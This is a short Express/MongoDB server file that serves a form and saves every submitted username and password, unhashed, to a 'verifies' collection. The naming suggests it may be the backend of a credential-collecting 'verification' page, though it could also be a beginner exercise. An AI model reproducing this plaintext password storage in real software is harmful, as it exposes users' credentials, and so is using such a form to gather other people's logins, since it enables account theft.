const express = require('express');
const path = require("path");
const dotenv = require('dotenv').config();
const mongoose = require('mongoose');
const app = express();

// Set the default view engine to EJS
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

// Connect to the MongoDB database named 'Verify'
mongoose
  .connect(process.env.VERIFICATION_DB_URI || 'mongodb://localhost:27017/Verify', {
    useNewUrlParser: true,
    useUnifiedTopology: true
  })
  .then(() => console.log('Connected to MongoDB database: Verify'))
  .catch((err) => console.error('Failed to connect to MongoDB:', err));

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Define the schema and model for the 'verifies' collection
const VerifySchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});

const Verify = mongoose.model('verifies', VerifySchema);

// Route for initial access
app.get('/', (req, res) => {
  res.render('index', {
    message: "All fields are required!",
    error: false
  });
});

// POST route to save user data to the 'verifies' collection
app.post('/', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).render('index', {
      message: 'All fields are required!',
      error: true
    });
  }

  try {
    await Verify.create({
      username,
      password
    });

    console.log('User data saved successfully to verifies collection');
    res.status(200).render('index', {
      message: 'Data saved successfully!',
      error: false
    });
  } catch (err) {
    console.error('Error saving user data:', err);
    res.status(500).render('index', {
      message: 'An error occurred while saving data',
      error: true
    });
  }
});

// Start the server
const port = process.env.PORT || 5001;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
